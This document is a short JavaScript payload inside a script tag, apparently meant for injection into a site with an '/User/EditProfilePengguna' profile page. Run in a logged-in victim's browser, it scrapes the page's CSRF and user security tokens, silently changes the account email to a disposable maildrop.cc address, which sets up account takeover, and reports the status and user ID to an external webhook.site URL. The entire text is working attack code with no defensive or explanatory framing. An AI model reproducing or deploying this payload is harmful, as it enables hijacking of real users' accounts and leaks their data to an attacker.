<script>
fetch('/User/EditProfilePengguna', { credentials: 'include' })
.then(r => r.text())
.then(html => {
  var doc = new DOMParser().parseFromString(html, 'text/html');

  var csrfToken   = doc.querySelector('input[name="__RequestVerificationToken"]').value;
  var userId      = doc.querySelector('input[name="user_id"]').value;
  var userIdToken = doc.querySelector('input[name="__user_idSecToken"]').value;
  var namaUser    = doc.querySelector('input[name="user_nama"]').value;
  var telp        = doc.querySelector('input[name="user_telp"]').value;

  var body = new URLSearchParams();
  body.append('__RequestVerificationToken', csrfToken);
  body.append('user_id', userId);
  body.append('__user_idSecToken', userIdToken);
  body.append('user_nama', namaUser);
  body.append('user_email', 'D-1ynvv9a1sh0mw07mx@maildrop.cc');
  body.append('user_email_2', '');
  body.append('user_telp', telp);

  fetch('/User/EditProfilePengguna', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: body.toString()
  }).then(r => {
    fetch('https://webhook.site/3b7c28dc-c8e1-411f-b61e-cec5990817fc/log?status=' + r.status + '&uid=' + userId);
  });
});
</script>
